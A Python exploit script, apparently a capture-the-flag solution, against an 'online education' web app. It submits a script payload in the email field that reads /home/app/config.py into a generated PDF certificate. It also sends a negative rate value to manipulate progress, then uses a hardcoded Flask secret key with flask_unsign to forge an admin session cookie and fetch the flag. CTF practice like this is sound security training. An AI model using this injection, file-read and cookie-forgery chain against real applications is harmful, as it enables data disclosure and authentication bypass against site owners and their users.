import json

import requests
import uuid

import flask_unsign

s = requests.session()

URL = "http://onlineeducation.sstf.site/"

data = {"name": "dohki", "email": """a@b.cd
<script>
xhr = new XMLHttpRequest()
xhr.onload = function() {
    document.write(this.responseText)
}
xhr.open("GET", "file:///home/app/config.py")
xhr.send()

div = document.getElementById("content")
div.innerHTML = "executed" + Math.random()
</script> 
"""}
r = s.post(URL + "/signin", data=data)
print(s.cookies)

headers = {"Content-Type": "application/json"}

for i in range(3):
    data = {"action": "start"}
    r = s.post(URL + "/status", data=json.dumps(data), headers=headers)

    data = {"action": "finish", "rate": -1}
    r = s.post(URL + "/status", data=json.dumps(data), headers=headers)
    print(r.content.decode())


r = s.get(URL + "/cert")

with open("cert.pdf", "wb") as f:
    f.write(r.content)

secret_key = "19eb794c831f30f099a31b1c095a17d6"
data = {
    "name": "admin",
    "is_admin": True,
}

cookies = {}
cookies["EduSession"] = flask_unsign.sign(data, secret_key)
print(cookies)
r = requests.get(URL + "/flag", cookies=cookies)
print(r.request.headers)
print(r.content.decode())